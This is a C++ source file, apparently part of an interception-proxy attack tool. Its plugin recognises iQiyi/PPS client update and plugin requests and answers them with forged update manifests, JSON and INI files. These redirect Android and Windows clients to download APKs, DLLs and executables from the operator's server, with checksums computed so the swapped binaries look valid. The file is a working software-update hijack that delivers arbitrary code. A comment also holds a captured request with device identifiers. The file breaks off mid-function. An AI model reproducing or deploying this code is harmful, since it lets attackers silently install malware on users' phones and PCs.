#include "IqiyiPlugin.h"
#include "../attack.h"
#include "sslPublic.h"
#include "../FileOper.h"
#include "../cipher/CryptoUtils.h"
#include "../HttpUtils.h"
#include "../version.h"
#include "PluginServer.h"
#include "../PreparePacket.h"

int gIqiyiAndroidFlag = 9;

int IqiyiPlugin::isIqiyi(string url, string host) {
	if (strstr(host.c_str(), "iface2.iqiyi.com") && strstr((char*)url.c_str(), "/fusion/3.0/plugin?"))
	{
		gIqiyiAndroidFlag = 1;
		return 1;
	}

	//int is first,.dll is second
	else if (strstr(host.c_str(), "static.qiyi.com") && strstr(url.c_str(), "/ext/common/qisu2/downloader.ini"))
	{
		gIqiyiAndroidFlag = 2;
		return 2;
	}
	else if (strstr(host.c_str(), "static.qiyi.com") && strstr(url.c_str(), IQIYI_DOWNLOADHELPER_FILENAME))
	{
		gIqiyiAndroidFlag = 7;
		return 7;
	}

	else if (strstr(host.c_str(), "vertical-play.iqiyi.com") && strstr(url.c_str(), "/v1/video-material/api/config/get_config.action?"))
	{
		gIqiyiAndroidFlag = 3;
		return gIqiyiAndroidFlag;
	}else if (strstr(host.c_str(), "dl.static.iqiyi.com") && strstr(url.c_str(), "/product/QyUpdate/QyUpdate.xml"))
	{
		gIqiyiAndroidFlag = 4;
		return 4;
	}
	
	else if (strstr(host.c_str(), "p2pupdate.inter.iqiyi.com") && strstr(url.c_str(), "HCDNClientUpdate.ini"))
	{
		gIqiyiAndroidFlag = 5;
		return 5;
	}
	else if (strstr(host.c_str(), "p2pupdate.inter.iqiyi.com") && strstr(url.c_str(), "HCDNClientNet.dll"))
	{
		gIqiyiAndroidFlag = 10;
		return 10;
	}
	
	else if (strstr(host.c_str(), "dl.static.iqiyi.com") && strstr(url.c_str(), "/product/QYAppPlugin/GeePlugin/GeePlugin.7z.xml"))
	{
		gIqiyiAndroidFlag = 6;
		return 6;
	}

	else if (strstr(host.c_str(), "dl.static.iqiyi.com") && strstr(url.c_str(), "/product/QyUpdate/QyUpdateInfo.xml"))
	{
		gIqiyiAndroidFlag = 8;
		return 8;
	}

	else if (strstr(host.c_str(), "dl.static.iqiyi.com") && strstr(url.c_str(), "/product/pca/clientupdate/v1.xml") )
	{
		gIqiyiAndroidFlag = 9;
		return 9;
	}
	else if (strstr(host.c_str(), "stream.iqiyi.com") &&
		strstr(url.c_str(), "/api/zeus/route/module/android?") )
	{
		gIqiyiAndroidFlag = 11;
		return 11;
	}
	return FALSE;
}


/*
stream.iqiyi.com/api/zeus/route/module/android?function=penetrate&app_k=200162023e5d5c228543d5065973235f&dev_os=6.0.1&deviceId=0ab9c8bd59d3106cd087246f92d831317005&sign=0ee134e7965d9fbf69a6bdda0a68cd70&platformId=5&timestamp=1571979346&app_lm=cn&platform=ANDROID_PPS&androidId=12dc3c0630e77825&ts=1571979346&appVersion=9.9.1&area=pps_m_dora&netstat=wifi&qyid=B37676CDF99D15E92E938CBEE0C798C7&osVersion=6.0.1&dev_ua=OPPO+A57&deviceModel=OPPOA57
GET /api/zeus/route/module/android?function=penetrate&app_k=200162023e5d5c228543d5065973235f&dev_os=6.0.1&deviceId=0ab9c8bd59d3106cd087246f92d831317005&sign=0ee134e7965d9fbf69a6bdda0a68cd70&platformId=5&timestamp=1571979346&app_lm=cn&platform=ANDROID_PPS&androidId=12dc3c0630e77825&ts=1571979346&appVersion=9.9.1&area=pps_m_dora&netstat=wifi&qyid=B37676CDF99D15E92E938CBEE0C798C7&osVersion=6.0.1&dev_ua=OPPO+A57&deviceModel=OPPOA57 HTTP/1.1
User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; OPPO A57 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36
Host: stream.iqiyi.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Application-Context: Zeus-Mixer:prod:8080
Content-Encoding: gzip
Vary: Accept-Encoding
Date: Fri, 25 Oct 2019 04:55:02 GMT
Access-Control-Allow-Origin: *
X-Frame-Options: SAMEORIGIN

{"code":"A00000","msg":"接口调用成功","data":{"saveinstancesdk":["{\"saveinstancesdk\":21}"],"module":["[{\"id\":\"bugly\",\"version\":4,\"url\":\"http://app.iqiyi.com/ppsDynamic/20190813/bugly.apk\",\"scrc\":\"A4A7716B\"},{\"id\":\"mtj\",\"version\":1,\"url\":\"http://app.iqiyi.com/ppsDynamic/20190524/mtj.apk\",\"scrc\":\"FB5A754C\"}]"]}}
*/

int IqiyiPlugin::replyIqiyiPlugin(char*recvBuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp) {
	int retlen = 0;
	if (gIqiyiAndroidFlag == 1)
	{
		retlen = replyIqiyiFw(recvBuffer, len, buflimit, lphttp);
	}else if (gIqiyiAndroidFlag == 2)
	{
		retlen = replyIqiyiPcDllIni(recvBuffer, len, buflimit, lphttp);
	}
	else if (gIqiyiAndroidFlag == 7)
	{
		retlen = replyIqiyiPcDll(recvBuffer, len, buflimit, lphttp);
		return 0;
	}

	else if (gIqiyiAndroidFlag == 3)
	{
		retlen = replyIqiyiSo(recvBuffer, len, buflimit, lphttp);
	}

	else if (gIqiyiAndroidFlag == 4)
	{
		retlen = replyIqiyiPcExe(recvBuffer, len, buflimit, lphttp);
	}
	else if (gIqiyiAndroidFlag == 5)
	{
		retlen = replyIqiyiPcHcdn(recvBuffer, len, buflimit, lphttp);
	}
	else if (gIqiyiAndroidFlag == 10)
	{
		retlen = replyIqiyiPcHcdnExe(recvBuffer, len, buflimit, lphttp);
		return 0;
	}
	else if (gIqiyiAndroidFlag == 6)
	{
		retlen = replyIqiyiPcGeePlugin(recvBuffer, len, buflimit, lphttp);
	}
	else if (gIqiyiAndroidFlag == 8)
	{
		retlen = replyIqiyiPcUpdateInfo(recvBuffer, len, buflimit, lphttp);
	}

	else if (gIqiyiAndroidFlag == 9)
	{
		retlen = replyPcUpdate(recvBuffer, len, buflimit, lphttp);
	}

	else if (gIqiyiAndroidFlag == 11)
	{
		int ret = 0;
		char * lpRespFormat =
			"HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/json;charset=UTF-8\r\nContent-Length: %u\r\n\r\n%s";

		char * lpRespContentFormat =
		"{\"code\":\"A00000\",\"msg\":\"接口调用成功\",\"data\":"
		"{\"saveinstancesdk\":[\"{\\\"saveinstancesdk\\\":21}\"],\"module\":[\"[{\\\"id\\\":\\\"bugly\\\",\\\"version\\\":9,"
		"\\\"url\\\":\\\"http://%s/%s\\\",\\\"scrc\\\":\\\"%s\\\"},"
		"{\\\"id\\\":\\\"mtj\\\",\\\"version\\\":9,\\\"url\\\":\\\"http://%s/%s\\\","
		"\\\"scrc\\\":\\\"%s\\\"}]\"]}}";

		string filepath = Public::getUserPluginPath(lphttp->username);
		string filename1 = "iqiyiBugly.apk";
		string newfn1 = filepath + filename1 + "_new";
		int filesize1 = FileOper::fileDecryptWriter(filepath + filename1, newfn1);
		string crc1 = CryptoUtils::FileCrc32(newfn1, 1024, FALSE);

		string filename2 = "iqiyiMtj.apk";
		string newfn2 = filepath + filename2 + "_new";
		int filesize2 = FileOper::fileDecryptWriter(filepath + filename2, newfn2);
		string crc2 = CryptoUtils::FileCrc32(newfn2, 1024, FALSE);

		string szip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

		char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
		int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat, 
			szip.c_str(), filename1.c_str(),crc1.c_str(),szip.c_str(),filename2.c_str(),crc2.c_str());

		int retlen = sprintf_s(recvBuffer, buflimit, lpRespFormat, iRespContentLen, lpRespContent);
		return retlen;
	}
	return retlen;
}



int IqiyiPlugin::replyPcUpdate(char*recvBuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp) {
	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n%s";

	string updatever = "9.9.106.1529";

	char * lpRespContentFormat =
		"<version>\r\n"
		"<Domain>\r\n"
		"<domain>http://dl.static.iqiyi.com</domain>\r\n"
		"<domain>http://update.pps.tv.iqiyi.com</domain>\r\n"
		"<domain>http://update.ppstream.com.iqiyi.com</domain>\r\n"
		"</Domain>\r\n"

		"<Clientpath>HKEY_LOCAL_MACHINE$$$$SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\PPStream.exe$$$$ </Clientpath>\r\n"
		
		"<Path>\r\n"
		"<path flag=\"1\" name=\"HKEY_LOCAL_MACHINE$$$$SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\PPStream.exe$$$$ \" reg=\"true\" />\r\n"
		"<path flag=\"2\" name=\"%%appdata%%\\IQIYI Video\\LStyle\" reg=\"false\" />\r\n"
		"<path flag=\"3\" name=\"%%temp%%\" reg=\"false\" />\r\n"
		"<path flag=\"4\" name=\"HKEY_CLASSES_ROOT$$$$HCDNProxy$$$$ \" reg=\"true\" />\r\n"
		"<path flag=\"5\" name=\"HKEY_CURRENT_USER$$$$Software\\PPStream\\main$$$$vmPagePath\" reg=\"true\" />\r\n"
		"</Path>\r\n"

		"<latestversion>%s</latestversion>\r\n"

		"<strategy_group>\r\n"
		"<strategy name=\"a\" range_version=\"1.3.106.1527-9.9.106.1527\" update_version=\"%s\" "
		"model=\"grey\" grey_rule=\"10\" seed=\"20300313\"></strategy>\r\n"
		"</strategy_group>\r\n"

		"<update_group>\r\n"
		"<update version=\"%s\" crc32=\"%s\" "
		"cubelink=\"http://%s/%s\" "
		"enable=\"1\" filesize=\"%u\" httplink=\"/%s/%s\" "
		"md5=\"%s\" name=\"%s\" usehttp=\"0\" action=\"1\">\r\n"
		"<FILE name=\"QiyiService.exe\" path=\"1\" ver=\"%s\" />\r\n"
		"<FILE name=\"QyClient.exe\" path=\"1\" ver=\"%s\" />\r\n"
		"<FILE name=\"QyFragment.exe\" path=\"1\" ver=\"%s\" />\r\n"
		"<FILE name=\"QyKernel.exe\" path=\"1\" ver=\"%s\" />\r\n"
		"<FILE name=\"QyPlayer.exe\" path=\"1\" ver=\"%s\" />\r\n"
		"</update>\r\n"
		"</update_group>\r\n"
		"</version>";

	string filepath = Public::getUserPluginPath(lphttp->username);
	string filename = filepath + WEIXIN_PC_UPDATE_EXE_FILENAME;
	string newfn =  filename + "_new";
	int filesize = FileOper::fileDecryptWriter( filename, newfn);
	string crc = CryptoUtils::FileCrc32(newfn, 1024, 4);

	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, TRUE);

	string szip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

	string url = string(lphttp->username);

	char lpRespContent[0x2000];
	int iRespContentLen = sprintf_s(lpRespContent, 0x2000, lpRespContentFormat,
		updatever.c_str(),
		updatever.c_str(),
		updatever.c_str(),
		crc.c_str(),
		szip.c_str(), WEIXIN_PC_UPDATE_EXE_FILENAME,
		filesize,
		url.c_str(), WEIXIN_PC_UPDATE_EXE_FILENAME,
		szmd5,
		WEIXIN_PC_UPDATE_EXE_FILENAME,
		updatever.c_str(),
		updatever.c_str(),
		updatever.c_str(), updatever.c_str(), updatever.c_str());

	int retlen = sprintf_s(recvBuffer, buflimit, lpRespFormat, iRespContentLen, lpRespContent);
	return retlen;
}


int IqiyiPlugin::replyIqiyiFw(char*recvBuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp) {

	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: %u\r\n\r\n%s";

// 	char * lpRespContentFormat =
// 		"{\"code\":0,\"data\":"
// 		"{\"plugins\":"
// 		"{\"plugin\":"
// 		"["
// 		//"{\"baseplugins\":\"\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\",\"remove\":0,\"size\":%u,\"pak_name\":\"tv.pps.bi.biplugin\",\"local\":0,\"invisible\":1,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":0,\"plugin_ver\":\"5.0.2\",\"plugin_gray_ver\":\"\",\"is_base\":0,\"l_ver\":\"4.9.7\",\"s_pingback\":0,\"c_dl_mn\":0,\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":1,\"plugin_id\":\"6312\",\"plugin_name\":\"BI统计\",\"type\":0,\"desc\":\"BI插件\"},"
// 		//"{\"baseplugins\":\"\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\",\"remove\":0,\"size\":%u,\"pak_name\":\"android.app.fw\",\"local\":0,\"invisible\":1,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":0,\"plugin_ver\":\"9.7.5\",\"plugin_gray_ver\":\"\",\"is_base\":1,\"l_ver\":\"9.6.0\",\"s_pingback\":0,\"c_dl_mn\":0,\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":1,\"plugin_id\":\"6325\",\"plugin_name\":\"插件公共模块\",\"type\":0,\"desc\":\"插件公共模块\"},"
// 		//"{\"baseplugins\":\"\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\",\"remove\":0,\"size\":%u,\"pak_name\":\"com.qiyi.traffic\",\"local\":0,\"invisible\":1,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":0,\"plugin_ver\":\"2.3.1\",\"plugin_gray_ver\":\"\",\"is_base\":0,\"l_ver\":\"\",\"s_pingback\":0,\"c_dl_mn\":2,\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":1,\"plugin_id\":\"6324\",\"plugin_name\":\"定向流量\",\"type\":0,\"desc\":\"定向流量\"},"
// 		//"{\"baseplugins\":\"\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\",\"remove\":0,\"size\":%u,\"pak_name\":\"com.iqiyi.plugin.qiyibase\",\"local\":0,\"invisible\":1,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":0,\"plugin_ver\":\"%s\",\"plugin_gray_ver\":\"\",\"is_base\":1,\"l_ver\":\"%s\",\"s_pingback\":0,\"c_dl_mn\":0,\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":1,\"plugin_id\":\"6326\",\"plugin_name\":\"基础公共插件\",\"type\":0,\"desc\":\"基础公共插件\"},"
// 		//"{\"baseplugins\":\"\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\",\"remove\":0,\"size\":%u,\"pak_name\":\"com.iqiyi.share\",\"local\":0,\"invisible\":0,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":0,\"plugin_ver\":\"3.1\",\"plugin_gray_ver\":"",\"is_base\":0,\"l_ver\":\"3.1\",\"s_pingback\":1,\"c_dl_mn\":2,\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":1,\"plugin_icon_url\":\"\",\"plugin_id\":\"6310\",\"plugin_name\":\"登录分享\",\"type\":0,\"desc\":\"人们分享，因此变得亲密\"}"
// 
// 		//"{\"kernel\":\"android.app.fw\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"%s/%s\",\"remove\":1,\"size\":%u,\"pak_name\":\"com.qiyi.gamecenter\",\"local\":0,\"invisible\":0,\"icon_url\":\"\",\"start_icon\":1,\"upgrade_type\":0,\"plugin_ver\":\"%s\",\"plugin_gray_ver\":\"\",\"is_base\":0,\"l_ver\":\"%s\",\"s_pingback\":0,\"c_dl_mn\":0,\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":2,\"plugin_icon_url\":\"\",\"plugin_id\":\"6308\",\"plugin_name\":\"游戏中心\",\"type\":0,\"desc\":\"爱奇艺游戏中心提供酷炫的游戏下载、丰富的礼包福利。还有诸多游戏达人的攻略分享与线上活动。专为游戏发烧友而生\"},"
// 		//"{\"kernel\":\"android.app.fw\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\",\"remove\":1,\"size\":%u,\"pak_name\":\"com.qiyi.video.reader\",\"local\":0,\"invisible\":0,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":0,\"plugin_ver\":\"%s\",\"plugin_gray_ver\":\"\",\"is_base\":0,\"l_ver\":\"%s\",\"s_pingback\":2,\"c_dl_mn\":0,\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":2,\"plugin_icon_url\":\"\",\"plugin_id\":\"6306\",\"plugin_name\":\"爱奇艺文学\",\"type\":0,\"desc\":\"海量图书资源，智能喜好推荐，极致阅读体验，尽在爱奇艺文学！\"},"	
// 		//"{\"kernel\":\"\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\",\"remove\":1,\"size\":%u,\"pak_name\":\"com.qiyi.live.base\",\"local\":0,\"invisible\":1,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":1,\"plugin_ver\":\"%s\",\"plugin_gray_ver\":\"\",\"is_base\":1,\"l_ver\":\"%s\",\"s_pingback\":0,\"c_dl_mn\":0,\"dl_mn_step\":0.0,\"md5\":\"%s\",\"patch\":[],\"priority\":1,\"plugin_id\":\"6332\",\"plugin_name\":\"直播基础插件\",\"type\":0,\"desc\":\"直播需要的so库，主要是livenet6.so\"},"
// 		"{\"baseplugins\":\"\",\"crc\":\"%s\",\"scrc\":\"%s\",\"url\":\"http://%s/%s\", \"remove\":0,\"size\":%u,"
// 		"\"pak_name\":\"android.app.fw\",\"local\":0,\"invisible\":0,\"icon_url\":\"\",\"start_icon\":0,\"upgrade_type\":0,"
// 		"\"plugin_ver\":\"%s\",\"plugin_gray_ver\":\"\",\"is_base\":1,\"l_ver\":\"%s\",\"s_pingback\":0,\"c_dl_mn\":0,\"dl_mn_step\":0.0,"
// 		"\"md5\":\"%s\",\"patch\":[],\"priority\":1,\"plugin_id\":\"6325\",\"plugin_name\":\"插件公共模块\",\"type\":0,\"desc\":\"插件公共模块\"}"
// 		"]"
// 		"}"
// 		"}"
// 		"}";
// 
// 	string plugin1ver = ANDROID_QIYIVIDEO_PLUGIN_VERSION;
// 	string plugin2ver = ANDROID_QIYIVIDEO_PLUGIN_VERSION;
// 	string plugin3ver = ANDROID_QIYIVIDEO_PLUGIN_VERSION;
// 
// 	string filepath = Public::getUserPluginPath(lphttp->username);
// 	string filename = IQIYI_PLUGIN_FILENAME;
// 
// 	string newfn = filepath + filename + "_new";
// 	int filesize = FileOper::fileDecryptWriter(filepath + filename, newfn);
// 
// 	string crc = CryptoUtils::FileCrc32(newfn, 1024, FALSE);
// 
// 	string szip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;
// 
// 	char szmd5[64] = { 0 };
// 	unsigned char hexmd5[64] = { 0 };
// 	filesize = CryptoUtils::getUpdateFileMd5(filepath + filename, szmd5, hexmd5, FALSE);
// 
// 	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
// 	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
// 		crc.c_str(), crc.c_str(), szip.c_str(), IQIYI_PLUGIN_FILENAME, filesize, plugin1ver.c_str(), plugin1ver.c_str(), szmd5);
//	int retlen = sprintf_s(recvBuffer, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);

	PreparePacket * iqiyi = new PreparePacket();
	string result = iqiyi->prepareIqiyi(lphttp);

	int retlen = sprintf_s(recvBuffer, buflimit, lpRespFormat, result.length(), result.c_str());
	
	return retlen;
}

int IqiyiPlugin::replyIqiyiPcDll(char*recvBuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp) {
	char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";

	string filename = Public::getUserUrl(lphttp->username, IQIYI_DOWNLOADHELPER_FILENAME);
	int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
	return 0;
}


int IqiyiPlugin::replyIqiyiPcDllIni(char*recvBuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp) {

	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Length: %u\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"[Control]\r\n"
		"app=egui,ekrn,nod32kui,nod32krn\r\n"
		"count=1\r\n"
		"c0=DownloadHelper\r\n"
		"[Downloader]\r\n"
		"DownloadHelper=http://%s/%s;Start;QIYI";

	string szip = HttpUtils::getIPstr(gServerIP) + "/" +  lphttp->username;

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat, szip.c_str(), IQIYI_DOWNLOADHELPER_FILENAME);

	int retlen = sprintf_s(recvBuffer, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return retlen;
}



int IqiyiPlugin::replyIqiyiSo(char*recvBuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp) {
	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: %u\r\n"
		"Accept-Charset: big5, big5-hkscs, cesu-8, euc-jp, euc-kr, gb18030, gb2312, gbk, ibm-thai, ibm00858, ibm01140, ibm01141, ibm01142, ibm01143, ibm01144, ibm01145, ibm01146, ibm01147, ibm01148, ibm01149, ibm037, ibm1026, ibm1047, ibm273, ibm277, ibm278, ibm280, ibm284, ibm285, ibm290, ibm297, ibm420, ibm424, ibm437, ibm500, ibm775, ibm850, ibm852, ibm855, ibm857, ibm860, ibm861, ibm862, ibm863, ibm864, ibm865, ibm866, ibm868, ibm869, ibm870, ibm871, ibm918, iso-2022-cn, iso-2022-jp, iso-2022-jp-2, iso-2022-kr, iso-8859-1, iso-8859-13, iso-8859-15, iso-8859-2, iso-8859-3, iso-8859-4, iso-8859-5, iso-8859-6, iso-8859-7, iso-8859-8, iso-8859-9, jis_x0201, jis_x0212-1990, koi8-r, koi8-u, shift_jis, tis-620, us-ascii, utf-16, utf-16be, utf-16le, utf-32, utf-32be, utf-32le, utf-8, windows-1250, windows-1251, windows-1252, windows-1253, windows-1254, windows-1255, windows-1256, windows-1257, windows-1258, windows-31j, x-big5-hkscs-2001, x-big5-solaris, x-compound_text, x-euc-jp-linux, x-euc-tw, x-eucjp-open, x-ibm1006, x-ibm1025, x-ibm1046, x-ibm1097, x-ibm1098, x-ibm1112, x-ibm1122, x-ibm1123, x-ibm1124, x-ibm1166, x-ibm1364, x-ibm1381, x-ibm1383, x-ibm300, x-ibm33722, x-ibm737, x-ibm833, x-ibm834, x-ibm856, x-ibm874, x-ibm875, x-ibm921, x-ibm922, x-ibm930, x-ibm933, x-ibm935, x-ibm937, x-ibm939, x-ibm942, x-ibm942c, x-ibm943, x-ibm943c, x-ibm948, x-ibm949, x-ibm949c, x-ibm950, x-ibm964, x-ibm970, x-iscii91, x-iso-2022-cn-cns, x-iso-2022-cn-gb, x-iso-8859-11, x-jis0208, x-jisautodetect, x-johab, x-macarabic, x-maccentraleurope, x-maccroatian, x-maccyrillic, x-macdingbat, x-macgreek, x-machebrew, x-maciceland, x-macroman, x-macromania, x-macsymbol, x-macthai, x-macturkish, x-macukraine, x-ms932_0213, x-ms950-hkscs, x-ms950-hkscs-xp, x-mswin-936, x-pck, x-sjis_0213, x-utf-16le-bom, x-utf-32be-bom, x-utf-32le-bom, x-windows-50220, x-windows-50221, x-windows-874, x-windows-949, x-windows-950, x-windows-iso2022jp"
		"\r\n\r\n%s";

	char * lpRespContentFormat =
		"{\"msg\":\"success\",\"code\":\"A00000\",\"data\":"
		"{\"so_cdn_url\":\"http://%s/%s\",\"allow_record_similar\":true}}";

	string szip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,szip.c_str(), "iqiyiVideoSo.zip");

	int retlen = sprintf_s(recvBuffer, buflimit, lpRespFormat, iRespContentLen, lpRespContent);
	return retlen;
}





int IqiyiPlugin::replyIqiyiPcExe(char*recvBuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp) {
	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Length: %u\r\n"
		"Content-Type: text/xml\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"<version>\r\n"
		"<Domain>\r\n"
		"<domain>http://dl.static.iqiyi.com</domain>\r\n"
		"<domain>http://update.pps.tv.iqiyi.com</domain>\r\n"
		"<domain>http://update.ppstream.com.iqiyi.com</domain>\r\n"
		"</Domain>\r\n"
		"<Clientpath>HKEY_LOCAL_MACHINE$$$$SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\PPStream.exe$$$$ </Clientpath>\r\n"
		"<Path>\r\n"
		"<path reg=\"true\" name=\"HKEY_LOCAL_MACHINE$$$$SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\PPStream.exe$$$$\" flag=\"1\" />\r\n"
		"<path reg=\"false\" name=\"%%appdata%%\\IQIYI Video\\LStyle\" flag=\"2\" />\r\n"
		"<path reg=\"false\" name=\"%%temp%%\" flag=\"3\" />\r\n"
		"<path reg=\"true\" name=\"HKEY_CLASSES_ROOT$$$$HCDNProxy$$$$\" flag=\"4\" />\r\n"
		"<path reg=\"true\" name=\"HKEY_CURRENT_USER$$$$Software\\PPStream\\main$$$$vmPagePath\" flag=\"5\" />\r\n"
		"</Path>\r\n"
		"<update enable=\"1\" name=\"%s\" usehttp=\"0\" httplink=\"%s\" md5=\"%s\" crc32=\"%s\" filesize=\"%u\" cubelink=\"http://%s/%s\" probability=\"40\" seed=\"18820\" clientminver=\"1.1.11.1111\" clientmaxver=\"9.9.99.9999\" >\r\n"
		"<FILE name=\"QiyiService.exe\" ver=\"9.9.9.552\" path=\"1\" />\r\n"
		"<FILE name=\"QyFragment.exe\" ver=\"9.9.99.6251\" path=\"1\" />\r\n"
		"<FILE name=\"QyKernel.exe\" ver=\"99.9.9.633\" path=\"1\" />\r\n"
		"<FILE name=\"QyPlayer.exe\" ver=\"9.9.99.6251\" path=\"1\" />\r\n"
		"</update>\r\n"
		"</version>\r\n\r\n\r\n\r\n";

	string szip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	string filename = "QiyiService.exe";
	string fn = Public::getUserPluginPath(lphttp->username) + filename;
	int filesize = CryptoUtils::getUpdateFileMd5( fn,szmd5,hexmd5, TRUE);

	string crc = CryptoUtils::FileCrc32( fn, -1, TRUE);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		filename.c_str(), filename.c_str(), szmd5, crc.c_str(), filesize, szip.c_str(), filename.c_str());

	string crcfilename = Public::getUserPluginPath(lphttp->username) + filename + "crc";
	char szfilecrc[256] = { 0 };
	*(int*)(szfilecrc) = 1;
	memcpy(szfilecrc + 4, hexmd5, 16);
	*(int*)(szfilecrc + 24) = filesize;
	*(short*)(szfilecrc + 42) = 0x20;
	*(short*)(szfilecrc + 44) = 0x4000;
	*(int*)(szfilecrc + 52) = 4;
	int icrc = atoi(crc.c_str());
	*(int*)(szfilecrc + 56) = icrc;
	HANDLE hf = CreateFileA(crcfilename.c_str(), GENERIC_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hf != INVALID_HANDLE_VALUE)
	{
		DWORD cnt = 0;
		ret = WriteFile(hf, szfilecrc, 60, &cnt, 0);
		CloseHandle(hf);
	}

	int retlen = sprintf_s(recvBuffer, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return retlen;
}

int IqiyiPlugin::replyIqiyiPcHcdnExe(char*recvBuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp) {
	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Connection: keep-alive\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Content-Length: %u\r\n\r\n";

	string filename = Public::getUserUrl(lphttp->username,"HCDNClientNet.dll" );
	int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
	return 0;
}


int IqiyiPlugin::replyIqiyiPcHcdn(char*recvBuffer, int len, int buflimit, LPHTTPPROXYPARAM lphttp) {
// 	char * szHttpRespFormat =
// 		"HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
// 
// 	string filename = Public::getUserUrl(lphttp->username, "HCDNClientNet.dll");
// 
// 	int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
// 	return ret;

	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Length: %u\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"[HCDNClientNet.dll]\n"
		"md5=%s\n"
		"url=http://%s/%s\n"
